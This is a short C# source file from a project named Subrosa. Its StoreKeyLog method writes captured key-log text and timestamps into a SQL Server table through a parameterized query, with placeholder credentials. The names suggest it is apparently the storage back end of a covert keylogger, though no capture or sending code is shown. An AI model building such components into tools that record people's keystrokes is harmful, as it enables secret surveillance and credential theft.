using Subrosa.Models;
using System.Data.SqlClient;

namespace Subrosa.Storage
{
    public class StorageService
    {
        public void StoreKeyLog(KeyLogModel model)
        {
            string connetionString = null;
            string sql = null;
            connetionString = "Data Source=YOURSQLSERVER\\YOURSQLSERVER;Initial Catalog=Subrosa;User id=yourUserID;Password=yourPass;";
            using (SqlConnection cnn = new SqlConnection(connetionString))
            {
                sql = "INSERT INTO FileLogs ([Log], [LogTime]) values(@Log,@LogTime)";
                cnn.Open();
                using (SqlCommand cmd = new SqlCommand(sql, cnn))
                {
                    cmd.Parameters.AddWithValue("@Log", model.Log);
                    cmd.Parameters.AddWithValue("@LogTime", model.LogTime);
                    cmd.ExecuteNonQuery();
                }
            }
        }
    }
}
